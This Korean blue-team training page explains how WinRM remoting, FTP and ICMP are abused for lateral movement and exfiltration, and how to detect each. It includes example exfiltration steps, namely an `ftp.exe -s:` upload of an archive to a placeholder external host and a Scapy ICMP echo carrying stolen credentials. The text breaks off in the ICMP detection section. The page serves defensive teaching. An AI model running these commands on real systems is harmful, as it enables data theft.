---
title: "PowerShell 원격(WinRM), FTP, 악성 ICMP"
tags:
  - training
  - blue-team
  - network
  - winrm
  - powershell
  - ftp
  - icmp
  - exfiltration
  - lateral-movement
---

# PowerShell 원격(WinRM), FTP, 악성 ICMP { #psremoting-ftp-icmp }

!!! abstract "이 페이지에서 다루는 것"
    겉모습은 전혀 다르지만 공통점이 하나 있는 세 프로토콜입니다. 셋 다 **옆으로 이동하거나 자료를 밖으로 빼내는** 조용한 길이 됩니다. 먼저 PowerShell 원격 — PSRP → WinRM(WSMV) → SOAP → HTTP(S)를 층층이 쌓아 **5985/5986** 포트에서 도는 "Windows판 SSH" — 을 실제 `Enter-PSSession`/`Invoke-Command` 명령으로 보여 주고, 선 위에서 어떻게 보이는지(`POST /wsman`, `multipart/encrypted`), 양쪽 끝에 어떤 흔적이 남는지(WinRM 6·91, `wsmprovhost.exe`, 4624 타입 3, PowerShell 400·4103·4104, 서비스 7040)를 봅니다. 다음은 FTP — 사라져 가는 암호화 없는 프로토콜이 왜 아직도 유출 통로인지, 제어 채널 대화를 한 줄씩, Zeek `ftp.log`, Windows 기본 `ftp.exe -s:`. 마지막은 ICMP — ping 패킷 하나에 최대 65,507바이트를 아무거나 실을 수 있는 이유, 정상 Windows·Linux ping 페이로드 모양, 직접 만든 페이로드를 16진수로 보기, ICMP 터널 찾는 법. 끝에 확인 문제와 해설이 있습니다.

!!! note "표기"
    **[보충]** = 꼭 알아야 할 실무 보충, **[정정]** = 흔히 잘못 알려진 내용 정정, **[변경됨]**/**[주의]** = 최근 바뀐 점과 옛 방식대로 하면 위험한 점. 호스트 이름, 도메인, 계정, IP는 모두 설명용 가상 값(`.example`, 문서용·사설 IP)입니다.

## 한눈에 보는 핵심 8가지 { #key-points }

1. <strong>PowerShell 원격(PowerShell Remoting)</strong>은 원격 Windows 컴퓨터에서 PowerShell을 대화형으로, 또는 스크립트로 실행하게 해 준다. 쓰는 느낌은 SSH 같지만 속은 **웹 서비스**다. PSRP 메시지를 WinRM(Microsoft판 WS-Management, "WSMV")이 나르고, SOAP XML로 포장해서, HTTP(S) `POST` 요청에 실어 보낸다.
2. WinRM은 <strong>TCP 5985(HTTP)</strong>와 <strong>5986(HTTPS)</strong>에서 기다린다. **Windows Server에서는 기본으로 켜져** 있고 **Windows 데스크톱에서는 꺼져** 있다. 이 포트로 가는 트래픽을 보면 한 컴퓨터가 다른 컴퓨터를 조종하는 모습이 쉽게 드러난다.
3. 완전한 원격 관리 도구이기 때문에, 공격자는 훔친 관리자 자격 증명만 있으면 별도 도구 없이 **횡적 이동, 원격 실행, 뒷문 설치**에 쓴다.
4. 방어는 SSH와 같다. **어느 출발지가 어느 목적지로 원격 접속해도 되는지 정하고**, 방화벽 범위로 강제하고, **그 밖의 모든 사용에 경보**를 건다. 그리고 있으면 안 되는 곳에서 WinRM 서비스가 켜지는지도 본다.
5. 도착지 PC에는 분명한 패턴이 남는다. **4624 로그온 타입 3**, WinRM 이벤트 **91**, 공격자가 실행하는 모든 것의 부모가 되는 **`wsmprovhost.exe`** 프로세스, PowerShell 로그 **400(HostName=ServerRemoteHost)**, **4103/4104**.
6. **FTP**(제어용 TCP 21 + 따로 여는 데이터 연결)는 오래되고 **암호화가 없으며** 사라져 가는 중이다. 그래도 방어자에게 중요한 건 공격 여러 단계에 쓸모가 있어서다. **오래된 FTP 서버 익스플로잇**, **훔친 자료를 내부에 모아 두기**, **비밀번호 엿보기**, **파일 바꿔치기**, 그리고 아직 FTP를 허용하는 방화벽을 통한 **유출**.
7. 우리 망이 FTP를 안 쓴다면 **FTP가 보이는 것 자체가 경보**다. 쓴다면 알려진 흐름만 허용 목록에 넣고 나머지에 경보를 건다 — 경계뿐 아니라 **내부망 안에서도**.
8. **ICMP** 패킷에는 **아무 데이터나** 담을 수 있는 페이로드 칸이 있다. 패킷 하나에 최대 **65,507바이트**. 패킷 제작 도구만 있으면 공격자는 "ping" 안에 훔친 자료나 C2 명령을 몰래 실을 수 있다. 들통나는 지점은 페이로드·크기·양이 진짜 `ping`이 만드는 모양과 다르다는 것이다.

## PowerShell 원격(WinRM) { #psremoting }

### 왜 생겼나 { #psremoting-why }

Linux 관리자에게는 늘 SSH가 있었습니다. 명령 하나면 원격 컴퓨터에서 바로 타이핑할 수 있죠. Windows에는 오랫동안 그런 게 없었습니다. 원격 데스크톱은 화면 전체를 주니 무겁고 자동화(스크립트)하기 어렵고, PsExec 같은 도구는 SMB로 서비스를 만들어서 동작합니다. 그래서 Microsoft가 내놓은 답이 **Windows 원격 관리(Windows Remote Management, WinRM)** — 공개 표준인 **WS-Management**를 Microsoft가 구현한 것(`winrm` 명령과 `WinRM` 서비스) — 이고, 그 위에 올린 것이 **PowerShell 원격**입니다.

비유하면, SSH는 두 컴퓨터 사이의 전용 전화선입니다. PowerShell 원격은 그보다는 **웹 양식(form)으로 편지를 보내는 것**에 가깝습니다. 명령 하나하나를 정해진 형식의 XML 문서로 써서, HTTP `POST`에 넣어, 상대편의 작은 웹 서비스에 건넵니다. 그쪽이 실행하고 결과를 다시 보내 줍니다. 쓰는 사람 입장에서는 똑같이 "치면 원격 컴퓨터가 대답"하지만, 속의 배관은 완전히 다릅니다.

### 프로토콜을 층별로 보기 { #psremoting-stack }

```
PowerShell Remoting Protocol (PSRP)     ← PowerShell objects, pipelines, commands
WinRM / WSMV (WS-Management for Windows) ← "create shell", "send input", "receive output"
SOAP (XML envelopes)                    ← the message format
HTTP  (TCP 5985)  or  HTTPS (TCP 5986)  ← the transport
TCP / IP
```

- **PSRP** — 맨 위층. PowerShell이 쓰는 개념(런스페이스, 파이프라인, 직렬화된 객체)을 다룹니다.
- **WSMV** — Microsoft가 확장한 WS-Management(이름은 이게 처음 들어간 Windows Vista에서 따온 "Windows Vista용 WS-Management 확장"). *Create*(셸 열기), *Command*, *Send*, *Receive*, *Delete* 같은 일반적인 동작을 제공합니다.
- **SOAP** — 동작 하나하나가 XML "봉투(envelope)"입니다. 머리말(header)에는 어디로, 무슨 동작인지, 본문(body)에는 데이터가 들어갑니다.
- **HTTP(S)** — 그 봉투가 `/wsman` 경로로 가는 HTTP `POST`의 본문에 실립니다.

방어자에게 이게 뜻하는 바: 원격 쪽에서는 **웹 수신기(WinRM 서비스, `HTTP.sys`를 통해)가 연결을 기다리고** 있고, 원격 명령은 웹 요청으로 도착합니다. 그래서 WinRM 트래픽은 웹 트래픽처럼 생겼습니다 — 80/443이 아니라 5985/5986 포트라는 것만 빼면요.

<strong>[보충]</strong> PowerShell 7(그 전에는 6)은 WinRM 대신 **SSH 위로도** 원격을 할 수 있습니다(`Enter-PSSession -HostName … -SSHTransport`, 또는 `-HostName`과 `-UserName`). 이 트래픽은 22번 포트로 가고 여느 SSH 세션과 똑같아 보입니다. [SSH 페이지](ssh-rdp-vnc.md)의 내용이 그대로 적용됩니다.

### 실제로 쓰는 모습 { #psremoting-commands }

관리자(또는 관리자 비밀번호를 손에 넣은 공격자)가 `ws-admin-0004`에서:

```
PS C:\> Test-WSMan -ComputerName srv-app-0007

wsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd
ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd
ProductVendor   : Microsoft Corporation
ProductVersion  : OS: 0.0.0 SP: 0.0 Stack: 3.0
```

- `Test-WSMan` — "이 호스트에서 WinRM 수신기가 대답하나?"를 묻습니다. 대답이 오면 5985로 서비스에 닿는다는 뜻입니다. 공격자도 똑같은 확인으로 목표를 찾습니다.
- `Stack: 3.0` — 지금 모든 Windows가 쓰는 WS-Management 스택 버전.

```
PS C:\> Enter-PSSession -ComputerName srv-app-0007 -Credential CORP\svc-deploy
[srv-app-0007]: PS C:\Users\svc-deploy\Documents> whoami
corp\svc-deploy
[srv-app-0007]: PS C:\Users\svc-deploy\Documents> exit
```

- `Enter-PSSession` — **대화형** 원격 세션을 엽니다(SSH 같은 경험).
- `-ComputerName srv-app-0007` — 목적지. 기본은 5985 포트로 가는 HTTP 위의 WinRM이고, 도메인에서는 **Kerberos**로 인증합니다.
- `-Credential CORP\svc-deploy` — 지금 사용자 대신 이 계정을 씁니다(비밀번호를 물어봄).
- 프롬프트가 `[srv-app-0007]: PS …`로 바뀝니다. 이제부터 치는 건 전부 원격 서버에서 실행됩니다.

```
PS C:\> Invoke-Command -ComputerName srv-app-0007,srv-app-0008 -ScriptBlock { Get-Process lsass }

 NPM(K)    PM(M)      WS(M)     CPU(s)      Id  SI ProcessName   PSComputerName
 ------    -----      -----     ------      --  -- -----------   --------------
     31     9.84      22.41       4.27     712   0 lsass         srv-app-0007
     29     9.12      21.07       3.90     704   0 lsass         srv-app-0008
```

- `Invoke-Command` — 스크립트 블록을 한 대 **또는 여러 대**에서 한꺼번에, 대화 없이 실행합니다. 관리자에게 원격이 강력한 이유가 이거고, 서버 50대에서 같은 걸 돌리고 싶은 공격자에게도 마찬가지입니다.
- `PSComputerName` — 결과가 어느 호스트에서 왔는지 보이게 PowerShell이 붙여 주는 칸.

같은 서비스로 들어가는 다른 길: `winrs -r:srv-app-0007 cmd`(Windows Remote Shell, 도착지에서 `winrshost.exe`로 보임), WinRM 위의 WMI, 그리고 Linux에서 돌리는 오픈소스 공격 도구 **Evil-WinRM** 같은 클라이언트.

### 선 위에서 보이는 모습 { #psremoting-wire }

```
POST /wsman HTTP/1.1
Connection: Keep-Alive
Content-Type: multipart/encrypted;protocol="application/HTTP-Kerberos-session-encrypted";boundary="Encrypted Boundary"
User-Agent: Microsoft WinRM Client
Content-Length: 1650
Host: srv-app-0007:5985
```

- `POST /wsman` — WS-Management 접속점. WinRM 트래픽은 거의 전부 이 경로 하나로 가는 POST입니다.
- `Content-Type: multipart/encrypted; … Kerberos-session-encrypted` — 운반은 평범한 HTTP지만 **SOAP 본문은 Kerberos 세션 키로 암호화**되어 있습니다. (NTLM이면 `HTTP-SPNEGO-session-encrypted`.)
- `User-Agent: Microsoft WinRM Client` — Windows 기본 클라이언트. 5985에서 다른 User-Agent(예: Ruby나 Python 라이브러리)가 보이면 Evil-WinRM 같은 Windows가 아닌 클라이언트를 의심합니다.
- `Host: srv-app-0007:5985` — 정체를 드러내는 포트 번호.

<strong>[정정]</strong> "5985의 WinRM은 평문이라 네트워크 센서가 명령을 읽을 수 있다"는 대개 틀립니다. 기본 설정에서 클라이언트와 서버는 암호화되지 않은 메시지를 거부하기(`AllowUnencrypted = false`) 때문에, Kerberos나 NTLM을 쓰면 본문이 메시지 단위로 암호화됩니다. 센서는 세션이 *있었다는 것*, 크기와 시간은 보지만 명령은 못 봅니다. 진짜 평문은 HTTP 위의 Basic 인증뿐이고, 그건 기본으로 꺼져 있습니다.

원격 세션 하나의 Zeek `conn.log` 줄:

```
ts=2026-11-19T03:12:40Z uid=CwR9m2 id.orig_h=10.20.30.41 id.orig_p=50114 id.resp_h=10.20.0.37 id.resp_p=5985 proto=tcp service=http duration=412.6 orig_bytes=188214 resp_bytes=903377 conn_state=SF
```

- `10.20.30.41 → 10.20.0.37:5985` — **일반 사용자 PC**가 서버로 원격 접속. 관리용 원격은 점프 호스트나 관리자 전용 PC에서 와야 합니다.
- `service=http` — 웹 포트가 아니어도 Zeek는 HTTP를 알아봅니다. `http.log`에는 `method=POST uri=/wsman user_agent=Microsoft WinRM Client`가 남습니다.
- `03:12`, 약 7분 — 한밤중의 대화형 세션.

### 누가 쓸 수 있고, 언제 켜져 있나 { #psremoting-defaults }

- **Windows Server:** WinRM이 **기본으로 켜져** 있습니다(Server 2012부터). 5985에 HTTP 수신기가 있고 방화벽 규칙도 열려 있어서, 서버는 원격 접속을 받을 준비가 된 상태입니다.
- **Windows 데스크톱:** **기본으로 꺼져** 있습니다. 누군가 `Enable-PSRemoting`(또는 `winrm quickconfig`)을 실행하거나 그룹 정책으로 켜야 합니다.
- **누가 접속할 수 있나:** 기본은 로컬 **Administrators** 그룹과 **Remote Management Users** 그룹만. 그래서 원격에는 **관리자(또는 위임받은) 자격 증명**이 필요하고, 공격자는 그걸 [자격 증명 덤프](../../../adversary/lsass-dumping.md)로 얻습니다.
- **도메인 vs 워크그룹:** 도메인에서는 Kerberos 덕분에 그냥 됩니다. 워크그룹 PC끼리는 추가 설정이 필요합니다(HTTPS, 또는 클라이언트의 `TrustedHosts` 목록에 목적지를 넣고 NTLM 사용). 클라이언트의 `TrustedHosts` 값이 `*`면 위험 신호입니다.

호스트의 수신기 확인:

```
PS C:\> winrm enumerate winrm/config/listener
Listener
    Address = *
    Transport = HTTP
    Port = 5985
    Enabled = true
    URLPrefix = wsman
    ListeningOn = 10.20.0.37, 127.0.0.1, ::1
```

- `Transport = HTTP`, `Port = 5985` — 기본 수신기. 5986의 `Transport = HTTPS` 수신기라면 `CertificateThumbprint`(인증서 지문)도 함께 보입니다.
- `Address = *` — 모든 네트워크 인터페이스에서 기다림.

### 남는 흔적 { #psremoting-traces }

**출발지(`ws-admin-0004` 또는 뚫린 PC)에서:**

```
Microsoft-Windows-WinRM/Operational  Event ID 6
Creating WSMan Session. The connection string is: srv-app-0007/wsman?PSVersion=5.1.22621.4391
```

- **WinRM 6** — **클라이언트** 쪽에서 "WS-Management 세션을 만드는 중"이라는 기록. 연결 문자열에 **목적지**가 적혀 있습니다. 뚫린 PC가 어느 호스트들로 원격 접속했는지 증명하는 방법이 이것입니다.
- 이 밖에: `Enter-PSSession`/`Invoke-Command`가 든 `powershell.exe`의 Sysmon 1/4688, 5985 포트 연결의 Sysmon 3.

**도착지(`srv-app-0007`)에서:**

```
Security 4624   An account was successfully logged on
Logon Type:             3
Account Name:           svc-deploy        Account Domain: CORP
Source Network Address: 10.20.30.41
Authentication Package: Kerberos

Microsoft-Windows-WinRM/Operational  Event ID 91
Creating WSMan shell on server with ResourceUri: http://schemas.microsoft.com/powershell/Microsoft.PowerShell

Sysmon 1   Process Create
Image:       C:\Windows\System32\wsmprovhost.exe
CommandLine: C:\Windows\system32\wsmprovhost.exe -Embedding
User:        CORP\svc-deploy

Sysmon 1   Process Create
Image:       C:\Windows\System32\cmd.exe
CommandLine: "C:\Windows\system32\cmd.exe" /c net group "Domain Admins" /domain
ParentImage: C:\Windows\System32\wsmprovhost.exe

Windows PowerShell  Event ID 400
Engine state is changed from None to Available.
    HostName=ServerRemoteHost
```

- **4624 타입 3** — **네트워크** 로그온(RDP처럼 타입 10이 아님). 원격은 계정의 자격 증명을 네트워크로 쓰기 때문에 출발지 IP에서 온 타입 3으로 보입니다. 관리자라면 보통 `4672`(특수 권한 부여)가 뒤따릅니다.
- **WinRM 91** — **서버** 쪽에서 셸을 만들었다는 기록. `ResourceUri … Microsoft.PowerShell` = PowerShell 원격 세션(`…/windows/shell/cmd` URI면 `winrs`).
- **`wsmprovhost.exe`** — 도착지에서 원격 PowerShell 세션을 실제로 돌려 주는 호스트 프로세스. **이 프로세스가 띄운 건 전부 원격에서 실행된 것**입니다. `wsmprovhost.exe → cmd.exe → net group "Domain Admins"`는 원격의 공격자가 정찰하는 모습입니다. (`winrs`면 부모가 `winrshost.exe`.)
- **`HostName=ServerRemoteHost`가 든 PowerShell 400** — *원격 세션 때문에* PowerShell 엔진이 시작됐다는 뜻. 로컬에서 시작하면 `ConsoleHost`로 남습니다.
- **4103/4104**(Microsoft-Windows-PowerShell/Operational) — 모듈 로깅과 **스크립트 블록 로깅**이 실제로 실행된 명령을 기록합니다. 선 위에서는 암호화되어 있었어도 여기에는 남습니다. 스크립트 블록 로깅은 모든 곳에서 켜 두세요. 공격자가 친 내용을 되찾는 곳이 여기입니다.

**있으면 안 되는 곳에서 원격이 켜지는 모습:**

```
System  Service Control Manager  Event ID 7040
The start type of the Windows Remote Management (WS-Management) service was changed from demand start to auto start.

System  Service Control Manager  Event ID 7036
The Windows Remote Management (WS-Management) service entered the running state.
```

- **7040** — 서비스 시작 유형이 바뀜. **워크스테이션**에서 WinRM이 자동 시작으로 바뀌었다면 누군가 `Enable-PSRemoting`을 실행한 것입니다. IT팀이 했다면 괜찮고, 아니라면 뒷문입니다.
- **7036** — 서비스가 실행됨. 5985에 대한 새 방화벽 규칙, 새 수신기와 함께 봅니다.

### 탐지하고 범위 줄이기 { #psremoting-defence }

- **허용 경로를 정한다:** "`10.20.5.0/24`의 관리용 점프 호스트는 서버로 원격 가능, 그 밖에는 불가." WinRM 방화벽 규칙의 **원격 주소 범위**와 네트워크 ACL로 강제합니다.
- **그 밖의 모든 것에 경보:** 워크스테이션끼리, 사용자 대역에서 서버로, 인터넷과 오가는 5985/5986. 출발지가 관리 호스트가 아닌데 생긴 WinRM 91 / `wsmprovhost.exe`.
- **`wsmprovhost.exe`·`winrshost.exe`의 자식 프로세스를 본다** — 정찰 명령, `rundll32`, 인코딩된 PowerShell([다운로드 크레이들](../../../adversary/powershell-cradles.md)).
- **켜지는 순간을 본다:** 워크스테이션의 WinRM 7040/7036, `TrustedHosts`가 `*`로 바뀜, `AllowUnencrypted`/Basic 인증이 켜짐.
- **쓸 수 있는 사람을 줄인다:** Administrators와 Remote Management Users를 작게 유지하고, 정해진 명령만 허용하는 JEA(Just Enough Administration) 접속점을 검토합니다.

SSH에도 같은 원칙이 적용됩니다. 허용할 출발지·목적지 대역을 정하고, 그 밖의 사용에는 경보를 겁니다. 기법 상세: [WMI와 WinRM](../../../adversary/wmi-winrm.md).

## FTP — 파일 전송 프로토콜 { #ftp }

### 오래된 프로토콜이 아직도 중요한 이유 { #ftp-why }

FTP(File Transfer Protocol)는 가장 오래된 인터넷 프로토콜 중 하나로, 암호화가 당연해지기 한참 전에 만들어졌습니다. 파일 전송은 대부분 HTTPS와 SFTP로 옮겨 갔고, Chrome과 Firefox는 거의 아무도 안 쓴다는 이유로 2021년에 FTP 지원을 없앴습니다. 그래도 FTP 서버와 클라이언트는 아직 남아 있습니다. 오래된 업무 시스템, 각종 장비, 복합기와 스캐너, 몇 년 전에 만들어 두고 잊은 파일 수거함 같은 곳에요.

분석가에게 FTP가 흥미로운 건 공격자를 **여러 단계에서** 도와주기 때문입니다.

- **첫 침투·익스플로잇.** FTP 서버 프로그램 중에는 오래되고 패치 안 된 것이 많고, 원격 코드 실행이나 인증 우회 같은 알려진 버그가 있습니다.
- **자격 증명 탈취.** 사용자 이름과 비밀번호가 **평문**으로 네트워크를 지나갑니다. 경로 중간에서 엿보는 사람은 누구나 읽을 수 있고, 그 비밀번호는 다른 곳에서도 재사용되는 경우가 많습니다.
- **바꿔치기.** 데이터도 암호화·무결성 검증이 없어서, 전송 중인 파일을 양쪽 모르게 바꿀 수 있습니다.
- **내부에 모아 두기(스테이징).** 내부 FTP 서버는 훔친 자료를 밖으로 보내기 전에 한곳에 모아 두기 편한 장소입니다.
- **유출.** 잘 알려져 있고, 아직 허용하는 방화벽도 있고, 원래 큰 파일을 옮기라고 만든 프로토콜 — 대량 자료를 밖으로 내보내기에 딱 좋은 길입니다. 2013년 미국 대형 유통업체의 유명한 침해 사고에서도, 훔친 카드 정보를 내부 서버에 모았다가 FTP로 내보냈다고 알려져 있습니다.

비유하면 FTP는 파일을 **엽서로** 보내는 것입니다. 거쳐 가는 누구나 읽을 수 있고, 누구나 고쳐 쓸 수 있습니다. 기술적으로는 21번 포트에 TLS가 없어서 모든 명령, 비밀번호, 파일 바이트가 패킷 캡처에 그대로 보인다는 뜻입니다.

### FTP 세션은 어떻게 동작하나 { #ftp-how }

FTP는 **연결을 두 종류** 씁니다.

- **TCP 21**로 가는 **제어 연결(control connection)** — 명령과 응답을 평문 텍스트 줄로 주고받습니다.
- 파일 하나나 목록 하나마다 따로 여는 **데이터 연결(data connection)**. 요즘 흔한 <strong>패시브 모드(passive mode)</strong>에서는 서버가 "내 이 높은 포트로 접속해"라고 알려 주고, <strong>액티브 모드(active mode)</strong>에서는 서버가 (20번 포트에서) 클라이언트로 거꾸로 접속합니다.

내부 서버가 압축 파일을 올리는 제어 채널 대화를 Wireshark의 "Follow TCP Stream"으로 보면 이렇습니다(`C:` = 클라이언트, `S:` = 서버).

```
S: 220 (vsFTPd 3.0.5)
C: USER drop
S: 331 Please specify the password.
C: PASS W1nter2026!
S: 230 Login successful.
C: TYPE I
S: 200 Switching to Binary mode.
C: EPSV
S: 229 Entering Extended Passive Mode (|||40417|)
C: STOR q4_customers.7z
S: 150 Ok to send data.
S: 226 Transfer complete.
C: QUIT
S: 221 Goodbye.
```

한 줄씩 보면:

- `220 (vsFTPd 3.0.5)` — 서버의 인사 **배너**. 소프트웨어 이름과 버전이 자주 들어 있어서 취약한 버전인지 확인할 때 쓸모 있습니다.
- `USER drop` / `331` — 클라이언트가 사용자 이름을 보내고, 서버가 비밀번호를 요구합니다.
- `PASS W1nter2026!` — **평문 비밀번호**. 이 트래픽을 캡처한 사람은 이제 이 비밀번호를 압니다.
- `230 Login successful.` — 로그인 성공. (`530 Login incorrect.`면 실패이고, 한 출발지에서 이게 많으면 비밀번호 맞히기입니다.)
- `TYPE I` / `200` — 바이너리("image") 모드. 압축 파일처럼 텍스트가 아닌 파일용.
- `EPSV` / `229 … (|||40417|)` — 확장 패시브 모드: "데이터 연결은 내 **40417** 포트로 열어." (옛 `PASV` 응답은 `227 Entering Passive Mode (203,0,113,90,157,225)`처럼 생겼고, 마지막 두 숫자가 포트를 나타냅니다: 157×256+225 = 40417.)
- `STOR q4_customers.7z` — 이 파일을 서버로 **올림(업로드)**. `RETR`면 내려받기입니다. 유출에서는 외부 서버로 가는 `STOR` 줄이 핵심입니다.
- `150` / `226 Transfer complete.` — 따로 연 데이터 연결에서 전송이 시작되고 끝남.
- `QUIT` / `221` — 세션 끝.

Zeek는 무언가를 전송한 명령마다 `ftp.log`에 한 줄을 남깁니다.

```
ts=2026-11-19T01:47:03Z uid=CfT7p0 id.orig_h=10.20.0.44 id.orig_p=51830 id.resp_h=203.0.113.90 id.resp_p=21 user=drop password=<hidden> command=STOR arg=ftp://203.0.113.90/./q4_customers.7z mime_type=application/x-7z-compressed file_size=1610612736 reply_code=226 reply_msg=Transfer complete. data_channel.passive=T data_channel.orig_h=10.20.0.44 data_channel.resp_h=203.0.113.90 data_channel.resp_p=40417
```

- `id.orig_h=10.20.0.44 → id.resp_h=203.0.113.90:21` — 내부 서버가 **인터넷** 호스트와 FTP로 통신.
- `user=drop`, `password=<hidden>` — Zeek는 사용자 이름은 남기지만, 익명 로그인이 아니면 기본으로 비밀번호를 가립니다(원본 pcap에는 여전히 있습니다).
- `command=STOR`, `arg=…/q4_customers.7z` — 업로드와 파일 이름.
- `mime_type=application/x-7z-compressed`, `file_size=1610612736` — 약 1.5GB짜리 압축 파일. 압축 파일 + 큰 크기 + 밖으로 = 전형적인 "모아서 빼내기" 유출입니다.
- `data_channel.*` — 따로 연 데이터 연결(패시브, 40417 포트). 이 연결의 `conn.log` 줄에 약 1.5GB의 `orig_bytes`가 찍힙니다.

### Windows에도 기본으로 들어 있다 { #ftp-lolbin }

Windows에는 아직 명령줄 FTP 클라이언트가 기본으로 있고, 공격자는 이걸 [있는 걸로 버티기(LOLBin) 도구](../../../adversary/lolbins.md)로 씁니다.

```
C:\> ftp -i -n -s:C:\ProgramData\u.txt 203.0.113.90
```

- `-s:C:\ProgramData\u.txt` — FTP 명령을 이 파일에서 읽어 옵니다(스크립트: `user drop W1nter2026!`, `binary`, `put q4_customers.7z`, `bye`). 누가 직접 칠 필요가 없습니다.
- `-i` — 파일마다 확인을 묻지 않음, `-n` — 자동 로그인을 하지 않음(스크립트의 `user` 줄이 대신함).

Sysmon 1 / 4688에서는 `-s:`가 붙은 `ftp.exe`로 보입니다. 요즘 PC에서는 드물어서 이것만으로도 경보 감입니다. `curl.exe -T <file> ftp://…`도 찾아보세요(Windows 기본 curl은 FTP 업로드도 됩니다).

### FTP를 어떻게 다루나 { #ftp-defence }

- **FTP를 안 쓴다면:** 막고, **FTP가 보이면 무조건 경보** — TCP 21, 또는 다른 포트라도 Zeek나 방화벽의 애플리케이션 식별이 FTP라고 표시한 모든 것.
- **쓴다면:** 정상 흐름(어느 클라이언트, 어느 서버, 어느 계정)을 목록으로 만들어 분석 규칙에서 빼고, 나머지 전부에 경보를 겁니다.
- **경계만이 아니라 내부망 안도 본다.** 내부 FTP는 자료를 모아 두는 곳이고, 평문 비밀번호가 망 구간을 넘어 새는 길입니다.
- 꼭 필요한 곳은 SFTP(SSH 위에서 FTP 비슷한 명령)나 FTPS(TLS 위의 FTP)로 **바꾸고**, 오래된 FTP 서버는 패치하거나 없앱니다.

## 악성 ICMP { #icmp }

### ping이 악할 수 있을까? { #icmp-why }

ICMP(Internet Control Message Protocol)는 네트워크의 안내 방송 시스템입니다. "목적지에 닿을 수 없음", "시간 초과"(`traceroute`가 이걸 씀), 그리고 `ping`을 이루는 유명한 <strong>에코 요청(echo request, 타입 8)</strong>과 **에코 응답(echo reply, 타입 0)**. "그냥 ping"이라서 많은 네트워크가 별 의심 없이 통과시킵니다.

그런데 에코 패킷에는 **데이터(페이로드) 칸**이 있고, 프로토콜은 거기에 뭐가 들었는지 신경 쓰지 않습니다. 에코 요청을 받은 쪽은 페이로드를 그대로 응답에 복사해서 돌려줄 뿐입니다. 그래서:

- 직접 패킷을 만들 수 있는 공격자는 페이로드를 **훔친 자료, 비밀번호, 명령**으로 채울 수 있습니다.
- 페이로드 최대 크기는 패킷 하나에 **65,507바이트**입니다(IP 패킷 최대 65,535바이트 − IP 헤더 20바이트 − ICMP 헤더 8바이트). 그보다 크면 가는 길에 조각(fragment)으로 나뉠 뿐입니다.
- 양쪽 끝에 작은 프로그램을 두면 "ping"의 흐름이 <strong>비밀 통로(covert channel)</strong>가 됩니다(ICMP 터널링). 요청에 실어 자료를 내보내고, 응답에 실어 명령을 받습니다.

비유하면 페이로드는 "거기 있어요?"라고만 쓰여야 할 엽서의 빈 뒷면입니다. 아무도 뒷면을 안 읽으니, 거기에 뭐든 쓸 수 있습니다.

### 정상 ping은 어떻게 생겼나 { #icmp-normal }

조작된 페이로드를 알아보려면 정상 모습을 알아야 합니다. tshark로 보면(`-x`는 바이트를 16진수로 보여 줌):

**Windows `ping`** — 32바이트, 늘 알파벳:

```
0000  61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70   abcdefghijklmnop
0010  71 72 73 74 75 76 77 61 62 63 64 65 66 67 68 69   qrstuvwabcdefghi
```

**Linux `ping`** — 56바이트. 시각 값 16바이트(64비트 시스템 기준) 다음에 `10 11 12 … 37`로 하나씩 올라가는 바이트:

```
0000  6f 5a 3c 69 00 00 00 00 a3 1c 0b 00 00 00 00 00   oZ<i............
0010  10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f   ................
0020  20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f    !"#$%&'()*+,-./
0030  30 31 32 33 34 35 36 37                           01234567
```

- 왼쪽 칸 — 페이로드 안에서의 위치(오프셋). 가운데 — 바이트의 16진수 값. 오른쪽 — 같은 바이트를 글자로(출력할 수 없는 건 `.`).
- 이 무늬는 운영체제의 ping 프로그램이 정해 둔 것입니다. 모니터링 도구와 네트워크 장비도 각자 알아볼 수 있는 고유 무늬가 있습니다.

### 직접 만든 페이로드 { #icmp-crafted }

Scapy(Python 패킷 제작 라이브러리)를 쓰면 내 마음대로 페이로드를 넣은 에코 요청을 한 줄로 보낼 수 있습니다.

```
>>> send(IP(dst="203.0.113.50")/ICMP(type=8, id=0x1a2b, seq=1)/Raw(load=b"user=j.kim;pass=Autumn#22;host=srv-fin-0002"))
.
Sent 1 packets.
```

- `IP(dst="203.0.113.50")` — 공격자 호스트로 가는 IP 헤더를 만듭니다.
- `/ICMP(type=8, id=…, seq=1)` — 그 위에 ICMP 에코 요청을 얹습니다(`/`는 "앞의 층 위에 이 층을 쌓아라"라는 뜻).
- `/Raw(load=b"…")` — 페이로드. 여기서는 훔친 자격 증명을 글자 그대로.
- `send(...)` — IP 계층에서 보냅니다(직접 만든 패킷(raw packet)을 보내려면 관리자/root 권한이 필요).

Wireshark 패킷 목록에서는 완전히 평범해 보입니다.

```
No.  Time      Source        Destination    Protocol Length Info
412  9.204118  10.20.0.44    203.0.113.50   ICMP     85     Echo (ping) request  id=0x1a2b, seq=1/256, ttl=64 (no response found!)
```

진실은 바이트에만 있습니다.

```
0000  75 73 65 72 3d 6a 2e 6b 69 6d 3b 70 61 73 73 3d   user=j.kim;pass=
0010  41 75 74 75 6d 6e 23 32 32 3b 68 6f 73 74 3d 73   Autumn#22;host=s
0020  72 76 2d 66 69 6e 2d 30 30 30 32                  rv-fin-0002
```

실제 도구는 보통 먼저 압축하거나 암호화하기 때문에, 읽을 수 있는 글자 대신 무작위처럼 보이는 바이트가 보입니다. 그것도 신호입니다. **정상 ping 페이로드는 예측 가능하고, 엔트로피(무작위성)가 높은 페이로드는 정상이 아닙니다.** 알려진 ICMP 터널 도구로는 ptunnel-ng, icmpsh, hans 등이 있습니다. 어떤 Linux 뒷문(잘 알려진 예가 BPFDoor)은 아예 포트를 열지도 않고, 특별히 만든 "매직(magic)" 패킷 — ICMP일 수도 있음 — 이 올 때까지 조용히 기다렸다가 깨어납니다.

### ICMP 악용 알아보기 { #icmp-detect }

Zeek는 ICMP "연결"도 `conn.log`에 남깁니다. ICMP **타입**은 `id.orig_p`에, **코드**는 `id.resp_p`에 들어갑니다.

```
ts=2026-11-19T02:05:11Z uid=CiC0x1 id.orig_h=10.20.0.44 id.orig_p=8 id.resp_h=203.0.113.50 id.resp_p=0 proto=icmp duration=3550.2 orig_pkts=41870 orig_bytes=41450112 resp_pkts=41870 resp_bytes=1339840 conn_state=OTH
```

- `proto=icmp`, `id.orig_p=8`, `id.resp_p=0` — 에코 요청(타입 8), 코드 0.
